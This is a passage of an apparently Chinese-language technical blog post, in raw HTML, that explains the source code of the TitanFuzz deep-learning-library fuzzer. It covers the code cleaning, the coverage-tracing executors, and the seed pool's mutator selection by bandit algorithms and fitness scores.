class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">code = original.replace(<span class="hljs-string">&#x27;if __name__ == &quot;__main__&quot;:&#x27;</span>, <span class="hljs-string">&quot;if True:&quot;</span>)<br>code = code.replace(<span class="hljs-string">&quot;if __name__ == &#x27;__main__&#x27;:&quot;</span>, <span class="hljs-string">&quot;if True:&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>去除print、import和from</p></li><li><p>去除cuda设置</p></li><li><p>去除session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">session_pattern1 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;with tf.compat.v1.Session()&quot;</span>)<br>session_pattern2 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;with tf.Session()&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_session</span>(<span class="hljs-params">original</span>):<br>    code = re.split(session_pattern1, original)[<span class="hljs-number">0</span>]<br>    code = re.split(session_pattern2, code)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li></ul><p>以上清理是使用模式匹配完成的</p><p>以下清理是使用ast完成的：</p><ul><li><p>清理comments</p><ul><li><p>先去除#开头的行</p></li><li><p>PassRemoveDocstring类去除docstring</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    root = ast.parse(code)<br>    PassRemoveDocstring().remove_docstring(root)<br>    modified = ast.fix_missing_locations(root)<br>    code_cleaned = astunparse.unparse(root)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure><p><em>PassRemoveDocstring见util&#x2F;astpasses.py</em></p></li></ul></li><li><p>语法修复，就是通过不断去除最后一行再parse、unparse、parse直到没有语法错误</p></li><li><p>去除name的keyword，形如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test(name=<span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><p>通过SearchAllCall获取所有call结点</p></li><li><p>去除name的keyword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(<br>    node<br>):  <span class="hljs-comment"># all calls should have keyword arguments already</span><br>    node.keywords = [a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> node.keywords <span class="hljs-keyword">if</span> a.arg != <span class="hljs-string">&quot;name&quot;</span>]<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="mycoverage"><a href="#mycoverage" class="headerlink" title="mycoverage"></a>mycoverage</h1><h2 id="mp-executor-py"><a href="#mp-executor-py" class="headerlink" title="mp_executor.py"></a>mp_executor.py</h2><p>全局两个executor，一个模式flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">RUN_CPU_MODE = <span class="hljs-literal">True</span><br>test_executor = <span class="hljs-literal">None</span><br>cov_executor = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><h3 id="init-test-executor"><a href="#init-test-executor" class="headerlink" title="init_test_executor"></a>init_test_executor</h3><ul><li><p>传递参数close_fd_mask和debug</p></li><li><p>torch：</p><ul><li><p>需要收集覆盖率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cov_executor = PyTorchCoverageExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li><li><p>初始化test_executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test_executor = PyTorchExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>tf：</p><ul><li><p>设置环境变量TF_CPP_MIN_LOG_LEVEL&#x3D;3</p></li><li><p>设置tf.logger</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.get_logger().setLevel(<span class="hljs-string">&quot;ERROR&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>tensorflow设置内存动态增长</p></li><li><p>传递参数cpu&#x3D;RUN_CPU_MODE</p></li><li><p>需要收集覆盖率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cov_executor = TensorFlowCoverageExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li><li><p>初始化test_executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test_executor = TensorFlowExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="exec-func"><a href="#exec-func" class="headerlink" title="exec_func"></a>exec_func</h3><p><em>单纯读取文件+执行</em></p><h3 id="exec-func-tf-cpu"><a href="#exec-func-tf-cpu" class="headerlink" title="exec_func_tf_cpu"></a>exec_func_tf_cpu</h3><p><em>单纯读取文件+设置cpu+执行</em></p><h3 id="cov-worker-tf"><a href="#cov-worker-tf" class="headerlink" title="cov_worker_tf"></a>cov_worker_tf</h3><ul><li><p>关闭输出的方式是直接导到&#x2F;dev&#x2F;null</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(os.devnull, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">if</span> close_fd_mask &amp; <span class="hljs-number">1</span>:<br>    sys.stdout = f<br><span class="hljs-keyword">if</span> close_fd_mask &amp; <span class="hljs-number">2</span>:<br>    sys.stderr = f<br></code></pre></td></tr></table></figure></li><li><p>设置回调函数，用于获取coverage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.settrace(tracer.trace_tf)<br></code></pre></td></tr></table></figure><p><em>trace_tf见mycoverage&#x2F;tracer.py</em></p></li><li><p>接受server传递的测试文件名</p></li><li><p>执行测试文件</p></li><li><p>回传错误信息或覆盖率</p></li></ul><h3 id="cov-worker-torch"><a href="#cov-worker-torch" class="headerlink" title="cov_worker_torch"></a>cov_worker_torch</h3><p><em>类似tf</em></p><h3 id="worker-tf"><a href="#worker-tf" class="headerlink" title="worker_tf"></a>worker_tf</h3><p><em>少一个覆盖率，其他一样</em></p><h3 id="worker-torch"><a href="#worker-torch" class="headerlink" title="worker_torch"></a>worker_torch</h3><p><em>少一个覆盖率，其他一样</em></p><h3 id="class-Executor"><a href="#class-Executor" class="headerlink" title="class Executor"></a>class Executor</h3><p>所有的executor都相当于一个server和一个client，通过一对pipe通信</p><ul><li><p>参数：</p><ul><li>worker：client，使用child_conn</li><li>single_test_timeout：单次测试timeout，默认10</li><li>close_fd_mask：需要关闭的pipe（stdout和stderr）</li><li>exec_func：执行测试文件使用的执行命令，默认为exec_func</li><li>debug：是否开启debug模式</li></ul></li><li><p>__init__：</p><ul><li><p>开启client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">self._p = ctx.Process(<br>    target=self.worker,<br>    args=(self._exec_func, self.child_conn, self._close_fd_mask),<br>)<br>self._p.start()<br></code></pre></td></tr></table></figure></li><li><p>设置test程序的文件夹路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self._test_dir = os.path.join(<br>    os.path.dirname(os.path.realpath(__file__)), <span class="hljs-string">&quot;test_programs&quot;</span><br>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>run_test：</p><ul><li>server向client发送测试文件名</li><li>轮询client，直到timeout重启client</li><li>等待client输出</li></ul></li></ul><h3 id="class-CoverageExecutor"><a href="#class-CoverageExecutor" class="headerlink" title="class CoverageExecutor"></a>class CoverageExecutor</h3><p>父类Executor</p><ul><li><p>__init__：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, worker, single_test_timeout=<span class="hljs-number">10</span>, **kwargs</span>):<br>    <span class="hljs-built_in">super</span>().__init__(worker, single_test_timeout, **kwargs)<br>    self.prev_coverage = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Init cov executor&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>run_test：</p><ul><li><p>server向client发送测试文件名</p></li><li><p>轮询client，直到timeout重启client</p></li><li><p>等待client输出，报告并更新coverage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Cov: <span class="hljs-number">502</span> -&gt; <span class="hljs-number">813</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-TensorFlowCoverageExecutor"><a href="#class-TensorFlowCoverageExecutor" class="headerlink" title="class TensorFlowCoverageExecutor"></a>class TensorFlowCoverageExecutor</h3><p>父类CoverageExecutor</p><ul><li><p>__init__：</p><ul><li><p>worker：cov_worker_tf</p></li><li><p>exec_func：</p><ul><li>cpu模式：exec_func_tf_cpu</li><li>非cpu模式：exec_func</li></ul></li><li><p>设置trace的library</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tracer.trace_library = <span class="hljs-string">&quot;tf&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>client执行memory_growth，并测试连通性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.run_test(os.path.join(self._test_dir, <span class="hljs-string">&quot;set_memory_growth.py&quot;</span>))<br></code></pre></td></tr></table></figure></li><li><p>设置check程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_tf_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-TensorFlowExecutor"><a href="#class-TensorFlowExecutor" class="headerlink" title="class TensorFlowExecutor"></a>class TensorFlowExecutor</h3><p>父类Executor</p><ul><li><p>__init__：</p><ul><li><p>worker：worker_tf</p></li><li><p>exec_func：</p><ul><li>cpu模式：exec_func_tf_cpu</li><li>非cpu模式：exec_func</li></ul></li><li><p>client执行memory_growth，并测试连通性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.run_test(os.path.join(self._test_dir, <span class="hljs-string">&quot;set_memory_growth.py&quot;</span>))<br></code></pre></td></tr></table></figure></li><li><p>设置check程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_tf_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-PyTorchExecutor"><a href="#class-PyTorchExecutor" class="headerlink" title="class PyTorchExecutor"></a>class PyTorchExecutor</h3><p>父类Executor</p><ul><li><p>__init__：</p><ul><li><p>worker：worker_torch</p></li><li><p>设置check程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_torch_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-PyTorchCoverageExecutor"><a href="#class-PyTorchCoverageExecutor" class="headerlink" title="class PyTorchCoverageExecutor"></a>class PyTorchCoverageExecutor</h3><p>父类CoverageExecutor</p><ul><li><p>__init__：</p><ul><li><p>worker：cov_worker_torch</p></li><li><p>设置trace的library</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tracer.trace_library = <span class="hljs-string">&quot;torch&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>设置check程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_torch_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="coverage-py"><a href="#coverage-py" class="headerlink" title="coverage.py"></a>coverage.py</h2><p>全局</p><ul><li>trace_library：要跟踪的库</li><li>prev_line：前一行</li><li>prev_filename：前一个文件</li><li>data：coverage</li></ul><p>设置跟踪函数，跟踪函数三个参数，frame，event，arg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.settrace(tracer.trace_tf)<br></code></pre></td></tr></table></figure><ul><li>event取值<ul><li>call：函数被调用时触发</li><li>return：函数返回时触发</li><li>exception：函数抛出异常时触发</li><li>line：语句执行</li></ul></li><li>frame<ul><li>f_code：当前帧正在执行的代码</li><li>f_lineno：当前帧正在执行的代码行号</li></ul></li></ul><p>记录文件内的跳转和文件间的跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> func_filename != prev_filename:<br>    data[func_filename + prev_filename].add((prev_line, func_line_no))<br><span class="hljs-keyword">else</span>:<br>    data[func_filename].add((prev_line, func_line_no))<br></code></pre></td></tr></table></figure><h1 id="util"><a href="#util" class="headerlink" title="util"></a>util</h1><h2 id="Seed-pool-py"><a href="#Seed-pool-py" class="headerlink" title="Seed_pool.py"></a>Seed_pool.py</h2><h3 id="class-GA"><a href="#class-GA" class="headerlink" title="class GA"></a>class GA</h3><ul><li><p>__init__：</p><ul><li><p>只需要注意self.num_generated初始化为batch_size</p></li><li><p>load api symbols</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.api_call_list, self.full_api_list = load_api_symbols(library)<br></code></pre></td></tr></table></figure><p>比如aaa.bbb.ccc()，self.api_call_list包括ccc，self.full_api_list包括aaa.bbb.ccc</p></li><li><p>初始化SnippetInfillArbitratyAPI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.recursive_infill = SnippetInfillArbitratyAPI(<br>    mask_identifier, self.api_call_list, self.full_api_list, self.library<br>)<br></code></pre></td></tr></table></figure><p><em>SnippetInfillArbitratyAPI见util&#x2F;instrumentor.py</em></p></li><li><p>调用_init_seed初始化种子，由子类分别实现</p></li><li><p>调用_init_mutator初始化变异器</p></li></ul></li><li><p>_init_mutator：</p><ul><li><p>根据self.mutator_set设置self.replace_type</p></li><li><p>根据self.mutator_selection_algo初始化变异器相关：</p><ul><li><p>heuristic：self.replace_type_p初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">self.replace_type_p = &#123;<br>    <span class="hljs-string">&quot;argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;keyword&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;method&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;prefix&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;prefix-argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;suffix-argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用多臂赌博机算法：调用_init_multi_arm</p></li></ul></li></ul></li><li><p>_init_multi_arm：epsilon默认0.1，replace_type_p两个维度分别为成功次数和失败次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.replace_type_p = &#123;&#125;<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> self.replace_type:<br>    <span class="hljs-comment"># Initialize with 1 to avoid starving</span><br>    <span class="hljs-comment"># Change initial state to 0.5 following the Thompson Sampling algorithm</span><br>    self.replace_type_p[t] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]  <span class="hljs-comment"># success / total</span><br>self.epsilon = <span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure></li><li><p>selection：</p><ul><li><p>num_selection默认是1</p></li><li><p>调用_select_seed选一个种子，由子类实现，选完会把种子从种子库中移除（<em>注：GAR_depth不会</em>）</p></li><li><p>调用_select_mutator选一个replace_type</p></li><li><p>如果replace_type为argument、keyword或method，调用add_infill进行mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">(<br>    num_replaced,<br>    infill_code,<br>    original_code,<br>) = self.recursive_infill.add_infill(<br>    o_ast,<br>    add_keywords=(replace_type == <span class="hljs-string">&quot;keyword&quot;</span>),<br>    replace_method=(replace_type == <span class="hljs-string">&quot;method&quot;</span>),<br>)<br></code></pre></td></tr></table></figure></li><li><p>如果没有可以mask的则使用SnippetInfill把argument全mask了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = SnippetInfill(<br>    mask_identifier=self.mask_identifier,<br>    api_call=self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=self.library,<br>    replace_type=<span class="hljs-string">&quot;argument&quot;</span>,<br>)<br>num_replaced, infill_code, _ = infill.add_infill(code)<br></code></pre></td></tr></table></figure></li><li><p>如果是其他的replace_type比如prefix和suffix，则使用SnippetInfill进行mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = SnippetInfill(<br>    mask_identifier=self.mask_identifier,<br>    api_call=self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=self.library,<br>    replace_type=replace_type,<br>)<br>num_replaced, infill_code, _ = infill.add_infill(code)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>_select_mutator：</p><ul><li><p>heuristic：分数概率化随机选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_type = np.random.choice(<br>    self.replace_type,<br>    <span class="hljs-number">1</span>,<br>    p=[<br>        self.replace_type_p[x] / <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(self.replace_type_p.values()))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.replace_type<br>    ],<br>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure></li><li><p>random：就随机选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_type = np.random.choice(self.replace_type)<br></code></pre></td></tr></table></figure></li><li><p>epsgreedy：epsilon-greedy</p><ul><li>1-epsilon：选择当前累积回报最高的臂</li><li>epsilon：选择未知臂</li></ul><p>这时self.replace_type_p是(success, total)，以success&#x2F;total计算回报</p></li><li><p>ucb：Upper Confidence Bound</p><p>计算每个臂的ucb值，选择ucb值最高的臂</p><img src="/2025/01/03/titanfuzz/ucb.png" class title="ucb"><ul><li>t：回合数</li><li>ni：第i臂被选择的次数，估计奖励是第i臂的平均奖励估计</li><li>估计奖励：这里使用成功率success&#x2F;total</li></ul></li><li><p>ts：Thompson Sampling</p><ul><li><p>贝叶斯定理</p><img src="/2025/01/03/titanfuzz/tom.png" class title="tom"><ul><li>P(A)：A的先验概率</li><li>P(A|B)：已知B发生A发生的概率，A的后验概率</li><li>P(B)：B的先验概率</li><li>P(B|A)：B的后验概率</li></ul></li><li><p>后验概率 &#x3D; （相似度 * 先验概率）&#x2F; 标准化常量</p><p>or</p><p>后验概率 &#x3D; 标准相似度 * 先验概率</p></li><li><p>这里A是成功次数，B是失败次数</p></li><li><p>先验分布使用beta分布，这样后验分布也是beta分布</p><img src="/2025/01/03/titanfuzz/beta.png" class title="beta"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">scores = []<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.replace_type:<br>    alpha, n_t = self.replace_type_p[a]<br>    beta = n_t - alpha<br>    score_a = np.random.beta(alpha, beta)<br>    scores.append(score_a)<br>max_index = np.argmax(scores)<br><span class="hljs-keyword">return</span> self.replace_type[max_index]<br></code></pre></td></tr></table></figure></li></ul></li><li><p>_update_mutator：</p><ul><li><p>heuristic：更新被选择的方法的score，<em>看注释吧</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># update the global counter</span><br><span class="hljs-comment"># roughly that score increases when at least 1/4 of generation is valid and unique</span><br>self.replace_type_p[replace_type] += <span class="hljs-built_in">len</span>(generations) - <span class="hljs-number">1</span> / <span class="hljs-number">3</span> * (<br>    self.num_generated - <span class="hljs-built_in">len</span>(generations)<br>)<br>self.replace_type_p[replace_type] = <span class="hljs-built_in">max</span>(<br>    <span class="hljs-number">1</span>, self.replace_type_p[replace_type]<br>)<br></code></pre></td></tr></table></figure></li><li><p>random：无需更新</p></li><li><p>多臂赌博机：success和total分别+1</p></li></ul></li><li><p>update：</p><ul><li>调用_update_seed更新种子，由子类实现</li><li>调用_update_mutator更新变异策略相关分数</li><li>对于每个种子调用_add_new_seed添加种子进种子库self.seeds，由子类实现</li></ul></li><li><p>get_highest_order_output：</p><ul><li>highest_order为最大变异层数，n为对应种子的info</li><li>并输出max_depth、重复api call次数和api call中带keyword的个数</li></ul></li></ul><h3 id="class-GA-Random"><a href="#class-GA-Random" class="headerlink" title="class GA_Random"></a>class GA_Random</h3><ul><li><p>_init_seed：单纯append</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">self.seeds = []<br>self.info_code = &#123;&#125;<br><span class="hljs-keyword">for</span> idx, seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(initial_seeds):<br>    self.seeds.append(seed)<br>    self.info_code[seed] = &#123;<br>        <span class="hljs-string">&quot;mutation_layer&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;used_as_seed&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;parent&quot;</span>: <span class="hljs-literal">None</span>,<br>        <span class="hljs-string">&quot;filename&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;_&#123;&#125;&#123;&#125;.py&quot;</span>.<span class="hljs-built_in">format</span>(self.api_call, <span class="hljs-string">&quot;seed&quot;</span>, idx + <span class="hljs-number">1</span>),<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>_select_seed：</p><p>就是随机选取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_select_seed</span>(<span class="hljs-params">self</span>):<br>    code = np.random.choice(self.seeds)<br>    self.seeds.remove(code)<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li><li><p>_update_seed：</p><p>更新的info，再把种子放回去，<em>emmmmm</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_update_seed</span>(<span class="hljs-params">self, code, value</span>):<br>    self.info_code[code][<span class="hljs-string">&quot;used_as_seed&quot;</span>] += self.num_generated<br>    self.seeds.append(code)<br></code></pre></td></tr></table></figure></li><li><p>_add_new_seed：</p><p>将生成的output（code）放进种子库self.seeds</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> code <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.info_code:<br>    self.num_valid += <span class="hljs-number">1</span><br>    self.info_code[code] = &#123;<br>        <span class="hljs-string">&quot;mutation_layer&quot;</span>: self.info_code[seed][<span class="hljs-string">&quot;mutation_layer&quot;</span>] + <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;used_as_seed&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;parent&quot;</span>: seed,<br>        <span class="hljs-string">&quot;replace_type&quot;</span>: replace_type,<br>        <span class="hljs-string">&quot;round&quot;</span>: rd,<br>        <span class="hljs-string">&quot;filename&quot;</span>: filename,<br>    &#125;<br>    self.seeds.append(code)<br></code></pre></td></tr></table></figure></li></ul><h3 id="class-GA-Coverage"><a href="#class-GA-Coverage" class="headerlink" title="class GA_Coverage"></a>class GA_Coverage</h3><ul><li>_init_seed：同GA_Random</li><li>_select_seed：同GA_Coverage</li><li>update：比GA多了个add_flag，只有覆盖率更新才添加种子</li><li>_update_seed：同GA_Coverage</li><li>_add_new_seed：同GA_Coverage</li></ul><h3 id="class-GAR-depth"><a href="#class-GAR-depth" class="headerlink" title="class GAR_depth"></a>class GAR_depth</h3><ul><li><p>_compute_fitness_score：</p><ul><li><p>获取max_depth</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">max_depth = DepthFinder(self.library).max_depth(code)<br></code></pre></td></tr></table></figure><p><em>DepthFinder见util&#x2F;instrumentor.py</em></p></li><li><p>获取unique_calls和ex_repeats</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">unique_calls, ex_repeats, repeats = UniqueFinder(self.library).count(code)<br></code></pre></td></tr></table></figure><p><em>UniqueFinder见util&#x2F;instrumentor.py</em></p></li><li><p>不同的fitness计算方式不同：</p><ul><li>fitness：unique_calls + max_depth - ex_repeats</li><li>fitnessue：unique_calls - ex_repeats</li><li>fitnessud：unique_calls + max_depth</li><li>fitnessde：max_depth - 